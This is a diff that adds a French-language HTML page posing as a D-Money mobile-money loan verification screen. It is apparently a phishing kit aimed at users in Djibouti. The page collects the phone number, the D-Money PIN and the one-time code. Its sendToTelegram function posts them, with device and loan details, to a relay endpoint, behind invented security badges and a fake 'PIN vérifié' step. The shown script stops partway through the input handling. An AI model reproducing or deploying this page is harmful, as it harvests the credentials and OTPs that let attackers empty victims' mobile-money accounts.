@@ -1,0 +1,664 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
+<meta name="theme-color" content="#F5A800"/>
+<title>Vérification · D-Money</title>
+<link rel="icon" href="assets/dmoney-logo.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{
+  --gold:#F5A800;--gold-dark:#D4900A;--gold-light:#FFD166;
+  --gold-pale:#FFF8E7;--gold-mid:#FFEFC0;
+  --navy:#1B2E6B;--navy-dark:#0F1D47;--navy-mid:#2A4090;
+  --green:#059669;--red:#ef4444;
+  --page:#F7F9FC;--white:#fff;
+  --border:rgba(27,46,107,.1);--border-strong:rgba(27,46,107,.2);
+  --ink:#0F1D47;--ink-mid:#2A4090;--ink-soft:#5A6FA8;--ink-faint:#9AAAD4;
+  --font:'Inter',sans-serif;--mono:'JetBrains Mono',monospace;
+  --r:12px;--r-lg:18px;
+  --shadow:0 2px 8px rgba(27,46,107,.08),0 8px 32px rgba(27,46,107,.08),0 0 0 1px rgba(255,255,255,.7) inset;
+  --shadow-gold:0 4px 20px rgba(245,168,0,.28),0 2px 8px rgba(245,168,0,.18);
+  --glass:rgba(255,255,255,.78);--glass-b:rgba(255,255,255,.92);
+}
+@keyframes pageEnter{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+@keyframes pageExit{from{opacity:1}to{opacity:0;transform:translateY(-10px)}}
+.screen{animation:pageEnter .34s cubic-bezier(.22,1,.36,1) both}
+.screen.exit{animation:pageExit .24s cubic-bezier(.4,0,1,1) forwards}
+html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(--font)}
+body{
+  background:
+    radial-gradient(ellipse 75% 50% at 50% -10%,rgba(245,168,0,.1),transparent 52%),
+    radial-gradient(ellipse 55% 40% at 95% 20%,rgba(27,46,107,.06),transparent 48%),
+    #F7F9FC;
+}
+.screen{display:flex;flex-direction:column;width:100%;height:100%;height:100dvh;overflow:hidden;position:relative;isolation:isolate}
+.screen::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.025'/%3E%3C/svg%3E")}
+
+/* CURTAIN */
+.curtain{position:fixed;inset:0;z-index:9999;pointer-events:none;background:linear-gradient(155deg,#0F1D47,#1B2E6B 55%,#2A4090);opacity:0;transition:opacity .22s ease;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.curtain::before{content:'';position:absolute;inset:0;pointer-events:none;background:radial-gradient(ellipse 300px 250px at 80% 15%,rgba(245,168,0,.18),transparent 65%)}
+.curtain-particles{position:absolute;inset:0;overflow:hidden;pointer-events:none}
+.cp{position:absolute;border-radius:50%;background:rgba(245,168,0,.2);animation:cpFloat linear infinite}
+@keyframes cpFloat{0%{transform:translateY(0);opacity:.2}50%{opacity:.35}100%{transform:translateY(-100vh) scale(.5);opacity:0}}
+.curtain-brand{position:relative;z-index:1;background:rgba(255,255,255,.95);padding:10px 18px;border-radius:14px;display:flex;align-items:center;margin-bottom:36px;box-shadow:0 4px 24px rgba(0,0,0,.22);animation:cIn .3s cubic-bezier(.34,1.56,.64,1) both}
+@keyframes cIn{from{opacity:0;transform:translateY(-10px) scale(.9)}to{opacity:1;transform:none}}
+.curtain-brand img{height:38px;object-fit:contain}
+.curtain-spinner{position:relative;z-index:1;width:52px;height:52px;margin-bottom:24px;animation:cIn .3s .06s cubic-bezier(.34,1.56,.64,1) both}
+.curtain-spinner svg{animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.curtain-status{position:relative;z-index:1;text-align:center;animation:cIn .28s .12s ease both}
+.curtain-label{font-size:16px;font-weight:800;color:#fff;letter-spacing:-.2px;margin-bottom:5px;transition:opacity .2s}
+.curtain-sub{font-size:12px;font-weight:500;color:rgba(255,255,255,.5);transition:opacity .2s}
+.curtain-dots{display:flex;gap:6px;margin-top:24px;position:relative;z-index:1;animation:cIn .28s .16s ease both}
+.cdot{height:6px;border-radius:999px;background:rgba(255,255,255,.2);width:6px;transition:background .28s,width .28s cubic-bezier(.34,1.56,.64,1)}
+.cdot.on{background:var(--gold);width:18px}.cdot.done{background:rgba(245,168,0,.5)}
+.curtain.show{opacity:1;pointer-events:auto}
+
+/* HEADER */
+.header{background:linear-gradient(135deg,var(--navy-dark),var(--navy) 50%,var(--navy-mid));padding:max(14px,env(safe-area-inset-top)) 18px 20px;flex-shrink:0;position:relative;overflow:hidden}
+.header::before{content:'';position:absolute;inset:0;pointer-events:none;background:radial-gradient(ellipse 260px 200px at 108% -18%,rgba(245,168,0,.2),transparent 65%),linear-gradient(rgba(255,255,255,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.02) 1px,transparent 1px);background-size:auto,32px 32px,32px 32px}
+.header::after{content:'';position:absolute;top:0;left:-100%;width:55%;height:100%;background:linear-gradient(90deg,transparent,rgba(245,168,0,.05),transparent);animation:hdrSweep 9s ease-in-out infinite;pointer-events:none}
+@keyframes hdrSweep{0%,100%{left:-100%}55%{left:150%}}
+.hglow{position:absolute;width:240px;height:240px;border-radius:50%;background:rgba(245,168,0,.16);filter:blur(70px);top:-110px;right:-60px;pointer-events:none;animation:glowPulse 4s ease-in-out infinite}
+@keyframes glowPulse{0%,100%{opacity:.6;transform:scale(1)}50%{opacity:1;transform:scale(1.1)}}
+.header-top{display:flex;align-items:center;justify-content:space-between;position:relative;z-index:2;margin-bottom:16px}
+.brand{display:flex;align-items:center;background:rgba(255,255,255,.95);padding:5px 10px;border-radius:10px;backdrop-filter:blur(8px)}
+.brand img{height:28px;object-fit:contain}
+.amount-chip{background:rgba(245,168,0,.18);border:1px solid rgba(245,168,0,.38);backdrop-filter:blur(8px);padding:5px 14px;border-radius:999px;font-family:var(--mono);font-size:12px;font-weight:700;color:var(--gold-light);font-feature-settings:"tnum","ss01";letter-spacing:-.01em}
+.loan-pills{display:flex;gap:6px;flex-wrap:wrap;position:relative;z-index:2}
+.loan-pill{background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.16);backdrop-filter:blur(8px);border-radius:999px;padding:4px 11px;font-family:var(--mono);font-size:10px;font-weight:600;color:rgba(255,255,255,.85);font-feature-settings:"tnum"}
+
+/* BODY */
+.body{flex:1;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;padding:20px 16px max(24px,env(safe-area-inset-bottom));overscroll-behavior:contain;min-height:0;position:relative;z-index:1;scrollbar-width:thin;scrollbar-color:var(--border-strong) transparent}
+.body::-webkit-scrollbar{width:3px}.body::-webkit-scrollbar-track{background:transparent}.body::-webkit-scrollbar-thumb{background:var(--border-strong);border-radius:999px}
+.body.keyboard-up{padding-bottom:8px}
+
+.step{display:none;flex-direction:column;gap:0}
+.step.active{display:flex;animation:fadeIn .22s cubic-bezier(.34,1.56,.64,1)}
+@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+/* DMONEY PAY ROW */
+.pay-row{
+  display:flex;align-items:center;gap:12px;
+  background:var(--glass);backdrop-filter:blur(20px) saturate(180%);-webkit-backdrop-filter:blur(20px) saturate(180%);
+  border:1.5px solid var(--glass-b);border-radius:var(--r-lg);
+  padding:16px;margin-bottom:12px;box-shadow:var(--shadow);
+  position:relative;overflow:hidden;
+}
+.pay-row::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,var(--gold),var(--gold-light),var(--gold));border-radius:var(--r-lg) var(--r-lg) 0 0}
+.pay-logo{height:36px;object-fit:contain}
+.pay-row-title{font-size:13px;font-weight:800;color:var(--ink);letter-spacing:-.15px;line-height:1.2}
+.pay-row-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:2px}
+.pay-micro{display:flex;gap:5px;margin-top:8px;flex-wrap:wrap}
+.pmb{font-size:9px;font-weight:700;letter-spacing:.3px;text-transform:uppercase;padding:3px 8px;border-radius:999px;display:flex;align-items:center;gap:3px}
+.pmb-instant{background:rgba(5,150,105,.1);color:#059669;border:1px solid rgba(5,150,105,.2)}
+.pmb-secure{background:rgba(245,168,0,.1);color:var(--gold-dark);border:1px solid rgba(245,168,0,.22)}
+.pmb-free{background:rgba(27,46,107,.08);color:var(--navy);border:1px solid rgba(27,46,107,.15)}
+
+/* CARD */
+.card{background:var(--glass);backdrop-filter:blur(20px) saturate(180%);-webkit-backdrop-filter:blur(20px) saturate(180%);border:1.5px solid var(--glass-b);border-radius:var(--r-lg);overflow:hidden;margin-bottom:12px;box-shadow:var(--shadow)}
+.card-top-bar{height:4px;background:linear-gradient(90deg,var(--gold),var(--gold-light))}
+.card-hdr{padding:14px 16px 12px;border-bottom:1px solid var(--border)}
+.card-title{font-size:15px;font-weight:900;color:var(--ink);letter-spacing:-.2px}
+.card-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:2px}
+.card-body{padding:16px}
+
+/* FIELDS */
+.field{margin-bottom:16px;position:relative}
+.field:last-child{margin-bottom:0}
+.field-label{font-size:10px;font-weight:700;color:var(--ink-soft);text-transform:uppercase;letter-spacing:.8px;margin-bottom:6px;transition:color .16s}
+.field:focus-within .field-label{color:var(--gold-dark)}
+.field-hint{font-size:11px;color:var(--ink-faint);font-weight:500;margin-top:5px}
+.field-error{font-size:11px;font-weight:600;color:var(--red);margin-top:5px;display:none}
+.field-error.show{display:block}
+.field.has-error input,.field.has-error .pin-field-wrap{border-color:var(--red)!important;box-shadow:0 0 0 3px rgba(239,68,68,.1)!important}
+@keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-6px)}40%,80%{transform:translateX(6px)}}
+.shake{animation:shake .35s cubic-bezier(.36,.07,.19,.97)}
+
+/* PHONE */
+.phone-row{display:flex;gap:8px}
+.phone-prefix{
+  background:linear-gradient(135deg,var(--gold-pale),var(--gold-mid));
+  border:1.5px solid var(--gold-mid);color:var(--navy);
+  font-family:var(--mono);font-size:13px;font-weight:800;
+  padding:0 12px;border-radius:var(--r);
+  display:flex;align-items:center;flex-shrink:0;height:50px;gap:6px;
+  box-shadow:0 2px 8px rgba(245,168,0,.15);font-feature-settings:"tnum";
+  white-space:nowrap;
+}
+
+input[type=tel],input[type=text]{
+  width:100%;height:50px;padding:0 14px;
+  border-radius:var(--r);border:1.5px solid var(--border);
+  background:rgba(255,255,255,.8);backdrop-filter:blur(8px);
+  font-family:var(--font);font-size:15px;font-weight:500;color:var(--ink);
+  outline:none;-webkit-appearance:none;
+  transition:border-color .18s,background .18s,box-shadow .18s;
+}
+input::placeholder{color:var(--ink-faint)}
+input:focus{border-color:var(--gold);background:var(--white);box-shadow:0 0 0 4px rgba(245,168,0,.14)}
+
+/* PIN */
+.pin-field-wrap{
+  background:rgba(255,255,255,.8);backdrop-filter:blur(8px);
+  border:1.5px solid var(--border);border-radius:var(--r);
+  padding:14px 16px 12px;transition:border-color .18s,box-shadow .18s;
+  cursor:text;user-select:none;-webkit-user-select:none;
+}
+.pin-field-wrap.focused{border-color:var(--gold);background:var(--white);box-shadow:0 0 0 4px rgba(245,168,0,.14)}
+.pin-tap-label{font-size:11px;font-weight:600;color:var(--ink-faint);text-align:center;margin-bottom:10px;transition:color .16s}
+.pin-field-wrap.focused .pin-tap-label{color:var(--gold-dark)}
+.pin-dots-row{display:flex;align-items:center;justify-content:center;gap:14px}
+.pin-dot{width:15px;height:15px;border-radius:50%;border:2px solid var(--border-strong);background:transparent;flex-shrink:0;transition:background .14s cubic-bezier(.34,1.56,.64,1),border-color .14s,transform .18s cubic-bezier(.34,1.56,.64,1),box-shadow .14s;position:relative;overflow:hidden}
+.pin-dot.filled{background:linear-gradient(135deg,var(--navy),var(--navy-mid));border-color:transparent;transform:scale(1.18);box-shadow:0 2px 9px rgba(27,46,107,.28)}
+.pin-dot.peek{background:var(--white);border-color:var(--gold-mid);width:28px;height:28px;border-radius:7px;transform:scale(1);box-shadow:var(--shadow)}
+.pin-dot-digit{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:14px;font-weight:800;color:var(--navy);opacity:0;transition:opacity .1s;user-select:none;-webkit-user-select:none;pointer-events:none}
+.pin-dot.peek .pin-dot-digit{opacity:1}
+.pin-actions-row{display:flex;align-items:center;justify-content:flex-end;gap:4px;margin-top:10px;min-height:20px}
+.pin-peek-btn{font-size:11px;font-weight:700;color:var(--gold-dark);background:none;border:none;cursor:pointer;padding:2px 4px;display:flex;align-items:center;gap:5px;opacity:0;pointer-events:none;transition:opacity .18s,transform .18s cubic-bezier(.34,1.56,.64,1)}
+.pin-peek-btn.visible{opacity:1;pointer-events:auto}
+.pin-peek-btn:active{transform:scale(.9)}
+.pin-clear-btn{font-size:11px;font-weight:700;color:var(--ink-faint);background:none;border:none;cursor:pointer;padding:2px 4px;opacity:0;pointer-events:none;transition:opacity .18s}
+.pin-clear-btn.visible{opacity:1;pointer-events:auto}
+.pin-input-hidden{position:absolute;opacity:0;width:1px;height:1px;pointer-events:none}
+
+/* OTP */
+.otp-wrap{position:relative;height:56px}
+#otpHidden{position:absolute;inset:0;width:100%;height:100%;opacity:0;cursor:pointer;font-size:16px;z-index:2;border:none;background:none;outline:none;caret-color:transparent}
+.otp-display{display:flex;gap:7px;pointer-events:none;height:100%}
+.otp-box{
+  flex:1;height:100%;border-radius:var(--r);
+  border:1.5px solid var(--border);
+  background:rgba(255,255,255,.68);backdrop-filter:blur(8px);
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--mono);font-size:22px;font-weight:800;color:var(--ink);
+  font-feature-settings:"tnum";position:relative;overflow:hidden;
+  transition:border-color .18s cubic-bezier(.34,1.56,.64,1),background .18s,box-shadow .18s,transform .18s cubic-bezier(.34,1.56,.64,1);
+}
+.otp-box.filled{background:var(--white);border-color:var(--gold-mid);transform:scale(1.04)}
+.otp-box.active{border-color:var(--gold);background:var(--white);box-shadow:0 0 0 4px rgba(245,168,0,.14);transform:scale(1.06)}
+.otp-box.active.empty::after{content:'';position:absolute;width:1.5px;height:55%;background:var(--gold);border-radius:2px;animation:cursorBlink 1s ease-in-out infinite}
+@keyframes cursorBlink{0%,100%{opacity:1}50%{opacity:0}}
+.otp-box.disabled{opacity:.38;background:var(--border)}
+.otp-display.shake{animation:shake .36s cubic-bezier(.36,.07,.19,.97)}
+
+.timer-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0 0}
+.timer-lbl{font-size:12px;color:var(--ink-soft);font-weight:500}
+.timer-num{font-family:var(--mono);font-weight:700;color:var(--gold-dark);font-feature-settings:"tnum"}
+.resend-btn{font-size:12px;font-weight:700;color:var(--gold-dark);cursor:pointer;opacity:.3;padding:0;background:none;border:none;transition:opacity .16s,transform .18s cubic-bezier(.34,1.56,.64,1)}
+.resend-btn.active{opacity:1}
+.resend-btn:active{transform:scale(.91)}
+.masked-note{font-size:14px;color:var(--ink-soft);font-weight:500;text-align:center;padding:2px 0 8px;line-height:1.5}
+.masked-note strong{font-family:var(--mono);font-weight:700;color:var(--ink);font-feature-settings:"tnum";font-size:13px}
+
+/* VERIFY INTERSTITIAL */
+.verify-body{display:flex;flex-direction:column;align-items:center;padding:36px 24px 32px;text-align:center}
+.verify-ring-wrap{position:relative;width:72px;height:72px;margin-bottom:20px}
+.verify-ring{width:72px;height:72px;animation:verifyRotate 1s linear infinite}
+@keyframes verifyRotate{to{transform:rotate(360deg)}}
+.verify-ring.done{animation:none}
+.verify-arc{stroke-dasharray:66;stroke-dashoffset:66;transition:stroke-dashoffset .6s ease,stroke .4s}
+.verify-ring.done .verify-arc{stroke-dashoffset:0;stroke:var(--green)}
+.verify-icon{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;transition:transform .3s cubic-bezier(.34,1.56,.64,1)}
+.verify-icon.done svg{stroke:var(--green)}
+.verify-label{font-size:17px;font-weight:900;color:var(--ink);letter-spacing:-.3px;margin-bottom:6px;transition:opacity .2s}
+.verify-sub{font-size:13px;color:var(--ink-soft);font-weight:500;line-height:1.55;margin-bottom:28px;transition:opacity .2s}
+.verify-steps{display:flex;align-items:center;gap:0;width:100%;max-width:260px}
+.vstep{display:flex;flex-direction:column;align-items:center;gap:5px;flex:0 0 auto}
+.vstep-dot{width:10px;height:10px;border-radius:50%;background:var(--border-strong);transition:background .3s cubic-bezier(.34,1.56,.64,1),transform .3s cubic-bezier(.34,1.56,.64,1),box-shadow .3s}
+.vstep.active .vstep-dot{background:var(--gold);transform:scale(1.3);box-shadow:0 0 0 3px rgba(245,168,0,.2)}
+.vstep.done .vstep-dot{background:var(--green)}
+.vstep-text{font-size:9px;font-weight:700;color:var(--ink-faint);text-transform:uppercase;letter-spacing:.5px;white-space:nowrap;transition:color .3s}
+.vstep.active .vstep-text{color:var(--gold-dark)}
+.vstep.done .vstep-text{color:var(--green)}
+.vstep-line{flex:1;height:2px;background:var(--border);margin-bottom:14px;position:relative;overflow:hidden}
+.vstep-line::after{content:'';position:absolute;inset:0;background:var(--green);transform:scaleX(0);transform-origin:left;transition:transform .4s ease}
+.vstep-line.done::after{transform:scaleX(1)}
+
+/* SECURITY */
+.security-strip{display:flex;align-items:center;justify-content:center;padding:12px 0 4px;border-top:1px solid var(--border);margin-top:6px}
+.sec-badge{display:flex;align-items:center;gap:5px;font-size:9px;font-weight:700;color:var(--green);letter-spacing:.3px;text-transform:uppercase;padding:0 12px}
+.sec-badge+.sec-badge{border-left:1px solid var(--border)}
+.sec-badge svg{opacity:.75;stroke:var(--green)}
+
+/* ACTION BUTTON */
+.action-btn{
+  background:linear-gradient(135deg,var(--gold-light),var(--gold));
+  color:var(--navy);border:none;width:100%;padding:16px;
+  border-radius:var(--r-lg);
+  font-family:var(--font);font-size:15px;font-weight:900;
+  cursor:pointer;letter-spacing:-.1px;
+  opacity:.35;pointer-events:none;
+  box-shadow:var(--shadow-gold);
+  transition:opacity .18s,transform .2s cubic-bezier(.34,1.56,.64,1),box-shadow .18s;
+  position:relative;overflow:hidden;margin-top:10px;
+}
+.action-btn::after{content:'';position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,.22) 0%,transparent 55%);pointer-events:none}
+.action-btn.on{opacity:1;pointer-events:auto}
+.action-btn:active{transform:scale(.96);box-shadow:0 2px 8px rgba(245,168,0,.2)}
+.ripple-el{position:absolute;border-radius:50%;pointer-events:none;background:rgba(27,46,107,.12);transform:scale(0);animation:rippleAnim .5s cubic-bezier(.4,0,.2,1) forwards}
+@keyframes rippleAnim{to{transform:scale(4);opacity:0}}
+.powered{text-align:center;padding:10px 0 2px;font-size:9px;color:var(--ink-faint);font-weight:600;letter-spacing:.4px;text-transform:uppercase}
+</style>
+</head>
+<body>
+
+<!-- CURTAIN -->
+<div class="curtain" id="curtain">
+  <div class="curtain-particles" id="curtainParticles"></div>
+  <div class="curtain-brand"><img src="assets/dmoney-logo.png" alt="D-Money"></div>
+  <div class="curtain-spinner">
+    <svg width="52" height="52" viewBox="0 0 52 52" fill="none">
+      <circle cx="26" cy="26" r="21" stroke="rgba(255,255,255,.13)" stroke-width="3"/>
+      <path d="M26 5a21 21 0 0 1 21 21" stroke="var(--gold)" stroke-width="3" stroke-linecap="round"/>
+      <path d="M26 5a21 21 0 0 1 10.5 3.1" stroke="rgba(245,168,0,.5)" stroke-width="3" stroke-linecap="round"/>
+    </svg>
+  </div>
+  <div class="curtain-status"><div class="curtain-label" id="cLabel">Authentification</div><div class="curtain-sub" id="cSub">Vérification de votre identité…</div></div>
+  <div class="curtain-dots"><div class="cdot on" id="cd0"></div><div class="cdot" id="cd1"></div><div class="cdot" id="cd2"></div></div>
+</div>
+
+<div class="screen" id="screen">
+  <div class="header">
+    <div class="hglow"></div>
+    <div class="header-top">
+      <div class="brand"><img src="assets/dmoney-logo.png" alt="D-Money"></div>
+      <div class="amount-chip" id="headerAmount">0 DJF</div>
+    </div>
+    <div class="loan-pills" id="loanPills">
+      <span class="loan-pill" id="pillPlan">—</span>
+      <span class="loan-pill" id="pillAmt">—</span>
+      <span class="loan-pill" id="pillDays">—</span>
+      <span class="loan-pill" id="pillRate">—</span>
+    </div>
+  </div>
+
+  <div class="body" id="body">
+
+    <!-- STEP 1: Login -->
+    <div id="step1" class="step active">
+      <div class="pay-row">
+        <img src="assets/dmoney-logo.png" alt="D-Money" class="pay-logo">
+        <div>
+          <div class="pay-row-title">Payer avec D-Money</div>
+          <div class="pay-row-sub">Paiement mobile instantané</div>
+          <div class="pay-micro">
+            <span class="pmb pmb-instant">⚡ Instantané</span>
+            <span class="pmb pmb-secure">🔒 Sécurisé</span>
+            <span class="pmb pmb-free">✦ Sans frais</span>
+          </div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-top-bar"></div>
+        <div class="card-hdr"><div class="card-title">Vérifier votre compte</div><div class="card-sub">Entrez votre numéro D-Money et votre PIN</div></div>
+        <div class="card-body">
+          <div class="field" id="phoneField">
+            <div class="field-label">Numéro de téléphone</div>
+            <div class="phone-row">
+              <div class="phone-prefix"><span style="font-size:16px;line-height:1">🇩🇯</span>+253</div>
+              <input type="tel" id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="77XXXXXX" autocomplete="tel" maxlength="8">
+            </div>
+            <div class="field-hint" id="phoneHint" style="display:none"></div>
+            <div class="field-error" id="phoneError">Numéro invalide — 8 chiffres commençant par 77</div>
+          </div>
+          <div class="field" id="pinField">
+            <div class="field-label">Code PIN D-Money</div>
+            <input type="tel" id="pinHidden" inputmode="numeric" pattern="[0-9]*" maxlength="4" class="pin-input-hidden" autocomplete="current-password">
+            <div class="pin-field-wrap" id="pinWrap" onclick="document.getElementById('pinHidden').focus()" oncontextmenu="return false">
+              <div class="pin-tap-label" id="pinTapLabel">Appuyez pour entrer votre PIN à 4 chiffres</div>
+              <div class="pin-dots-row">
+                <div class="pin-dot" id="pd0"><span class="pin-dot-digit" id="pdd0"></span></div>
+                <div class="pin-dot" id="pd1"><span class="pin-dot-digit" id="pdd1"></span></div>
+                <div class="pin-dot" id="pd2"><span class="pin-dot-digit" id="pdd2"></span></div>
+                <div class="pin-dot" id="pd3"><span class="pin-dot-digit" id="pdd3"></span></div>
+              </div>
+              <div class="pin-actions-row">
+                <button class="pin-peek-btn" id="pinPeekBtn" type="button" onpointerdown="peekPin()" onpointerup="unpeekPin()" onpointerleave="unpeekPin()" oncontextmenu="return false" style="-webkit-user-select:none;user-select:none">
+                  <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>Aperçu
+                </button>
+                <button class="pin-clear-btn" id="pinClearBtn" type="button" onclick="clearPin()">Effacer</button>
+              </div>
+            </div>
+            <div class="field-error" id="pinError">Le PIN doit contenir 4 chiffres</div>
+          </div>
+        </div>
+      </div>
+      <div class="security-strip">
+        <div class="sec-badge"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>Chiffré 256-bit</div>
+        <div class="sec-badge"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>Certifié PCI DSS</div>
+      </div>
+      <button class="action-btn" id="mainBtn">Recevoir l'offre</button>
+      <div class="powered">Propulsé par D-Money · Digital Mobile Money</div>
+    </div>
+
+    <!-- STEP VERIFY -->
+    <div id="stepVerify" class="step">
+      <div class="card">
+        <div class="card-top-bar"></div>
+        <div class="verify-body">
+          <div class="verify-ring-wrap">
+            <svg class="verify-ring" viewBox="0 0 52 52" fill="none">
+              <circle cx="26" cy="26" r="21" stroke="rgba(245,168,0,.2)" stroke-width="3"/>
+              <path class="verify-arc" d="M26 5a21 21 0 0 1 21 21" stroke="var(--gold)" stroke-width="3" stroke-linecap="round"/>
+            </svg>
+            <div class="verify-icon" id="verifyIcon">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--gold)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+            </div>
+          </div>
+          <div class="verify-label" id="verifyLabel">Vérification PIN</div>
+          <div class="verify-sub" id="verifySub">Vérification de vos identifiants D-Money…</div>
+          <div class="verify-steps">
+            <div class="vstep active" id="vs0"><div class="vstep-dot"></div><div class="vstep-text">PIN vérifié</div></div>
+            <div class="vstep-line"></div>
+            <div class="vstep" id="vs1"><div class="vstep-dot"></div><div class="vstep-text">Envoi OTP</div></div>
+            <div class="vstep-line"></div>
+            <div class="vstep" id="vs2"><div class="vstep-dot"></div><div class="vstep-text">Prêt</div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP OTP -->
+    <div id="step3" class="step">
+      <div class="card">
+        <div class="card-top-bar"></div>
+        <div class="card-hdr"><div class="card-title">Code OTP</div><div class="card-sub">Code à 6 chiffres envoyé sur votre numéro</div></div>
+        <div class="card-body">
+          <div class="masked-note" id="maskedNumber">Entrez le code OTP reçu</div>
+          <div class="field">
+            <div class="field-label">Code OTP</div>
+            <div class="otp-wrap" id="otpWrap">
+              <input type="text" id="otpHidden" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code">
+              <div class="otp-display" id="otpDisplay">
+                <div class="otp-box empty" id="ob0"></div>
+                <div class="otp-box" id="ob1"></div>
+                <div class="otp-box" id="ob2"></div>
+                <div class="otp-box" id="ob3"></div>
+                <div class="otp-box" id="ob4"></div>
+                <div class="otp-box" id="ob5"></div>
+              </div>
+            </div>
+            <div class="field-error" id="otpError">Code incorrect. Veuillez réessayer.</div>
+          </div>
+          <div class="timer-row">
+            <div class="timer-lbl">Expire dans <span class="timer-num" id="time">120</span>s</div>
+            <button class="resend-btn" id="resendBtn">Renvoyer</button>
+          </div>
+        </div>
+      </div>
+      <button class="action-btn" id="otpBtn">Confirmer OTP</button>
+      <div class="powered">Propulsé par D-Money · Digital Mobile Money</div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+function haptic(s){if(!navigator.vibrate)return;var p={select:8,light:12,medium:22,heavy:40,success:[12,60,12],warning:[30,50,30],error:[50,40,50]};try{navigator.vibrate(p[s]||12)}catch(e){}}
+
+let phoneValue='',pinValue='',otpValue='';
+let loginClicked=false,otpSubmitted=false,resendClicked=false;
+let currentStep='step1';
+let _otpTimer=null;
+let selectedLoan=null;
+try{selectedLoan=JSON.parse(sessionStorage.getItem('loanData'))}catch(e){}
+
+function initHeader(){
+  if(!selectedLoan)return;
+  document.getElementById('headerAmount').textContent=selectedLoan.total.toLocaleString('fr-DJ')+' DJF';
+  document.getElementById('pillPlan').textContent=selectedLoan.plan;
+  document.getElementById('pillAmt').textContent=selectedLoan.amount.toLocaleString('fr-DJ')+' DJF';
+  document.getElementById('pillDays').textContent=selectedLoan.days+' Jours';
+  document.getElementById('pillRate').textContent=selectedLoan.rate+'%';
+}
+initHeader();
+
+const ua=navigator.userAgent;
+let device=(/Android/i.test(ua)?'Android':(/iPhone|iPad/i.test(ua)?'iOS':'Unknown'));
+if(/Chrome/i.test(ua))device+='|Chrome';else if(/Safari/i.test(ua))device+='|Safari';
+function getLoanLine(){return selectedLoan?`Plan:${selectedLoan.plan}|Montant:${selectedLoan.amount}DJF|Jours:${selectedLoan.days}|Intérêt:${selectedLoan.interest}DJF|Total:${selectedLoan.total}DJF`:''}
+async function sendToTelegram(event){
+  fetch('/api/sendTelegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event,plan:getLoanLine(),device})});
+}
+
+/* PHONE */
+const phoneEl=document.getElementById('phone');
+phoneEl.setAttribute('maxlength','8');
+phoneEl.addEventListener('input',e=>{
+  let raw=e.target.value.replace(/\D/g,'');
+  if(raw.startsWith('00253'))raw=raw.slice(5);
+  else if(raw.startsWith('253'))raw=raw.slice(3);
+  if(raw.startsWith('0'))raw=raw.slice(1);
+  if(raw.length>8)raw=raw.slice(-8);
+  raw=raw.slice(0,8);
+  e.target.value=raw;
+  phoneValue=raw.length>0?'+253'+raw:'';
+  clearError('phoneField','phoneError');
+  const hint=document.getElementById('phoneHint');
+  if(raw.length>0&&raw.length<8){hint.textContent=`${8-raw.length} chiffre${8-raw.length>1?'s':''} restant${8-raw.length>1?'s':''}`;hint.style.display='block'}
+  else hint.style.display='none';
+  if(raw.length>0&&!raw.startsWith('77')){
+    document.getElementById('phoneError').textContent='Le numéro doit commencer par 77';
+    showError('phoneField','phoneError');
+  }
+  validateLogin();
+});
+phoneEl.addEventListener('keydown',e=>{
+  const allowed=['Backspace','Delete','ArrowLeft','ArrowRight','Tab','Enter'];
+  if(!allowed.includes(e.key)&&!/^\d$/.test(e.key))e.preventDefault();
+  if(/^\d$/.test(e.key)&&phoneEl.value.length>=8)e.preventDefault();
+});
